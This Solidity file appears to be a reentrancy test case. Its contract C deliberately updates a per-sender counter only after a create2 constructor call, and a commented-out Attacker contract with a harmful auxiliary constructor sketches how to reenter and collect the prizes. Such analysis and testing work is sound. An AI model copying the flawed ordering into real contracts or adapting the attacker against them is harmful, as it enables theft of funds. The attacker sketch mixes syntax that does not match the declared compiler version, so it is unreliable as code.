pragma solidity ^0.5.0;

// SPDX-License-Identifier: GPL-3.0


contract C {

    mapping (address => uint) public counters;

    function deploy_and_win(bytes memory initCode, address payable winner, uint salt) public payable returns (address) {
		// to perform a deploy, 100 is required
		require(msg.value == 100);

		// every 10 deploys, a prize of 200 is sent to the second argument 
		if ((counters[msg.sender] + 1) % 10 == 0) {
			winner.transfer(200);	// cannot reenter from here due to low gas
		}

		address addr;
        assembly {
            addr := create2(0, add(initCode, 0x20), mload(initCode), salt)	// can reenter only from here, i.e. from the constructor code
            if iszero(addr) {
                revert(0, 0)
            }
        }

		counters[msg.sender] += 1; // side effect after constructor call makes this vulnerable	
		return addr;
    }
}

// contract Attacker {
//     bytes private create_auxharmless_initcode;
//     bytes private create_auxharmful_initcode;
//     address private victim;
//     uint salt;

//     // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
//     constructor(bytes memory _create_auxharmless_initcode, bytes memory _create_auxharmful_initcode, address _victim, uint _salt)  public {    
//         create_auxharmless_initcode = _create_auxharmless_initcode;
//         create_auxharmful_initcode = _create_auxharmful_initcode;
//         victim = _victim;
//         salt = _salt;
//     }
//     function attack() public {
// 		C v = C(victim);
//         uint i = 0;
//         while (true) {
//             if (i % 10 == 0)
//                 // attack only every 10 instances, i.e. when some money is transfered
//     	        v.deploy_and_win{value: 100}(create_auxharmful_initcode, (address(this)), salt);
//             else
//                 v.deploy_and_win{value: 100}(create_auxharmless_initcode, (address(this)), salt);
//         }            
//     }
// 	function reenter() external {
// 		C(victim).deploy_and_win{value: 100}(create_auxharmful_initcode, (address(this)), salt);
// 	}
//     function() external payable {}
// }

// contract AuxHarmless {
//     constructor()  public {}
// }

// contract AuxHarmful {
//     constructor(address payable attacker)  public {
// 		Attacker(attacker).reenter();
//     }
// }

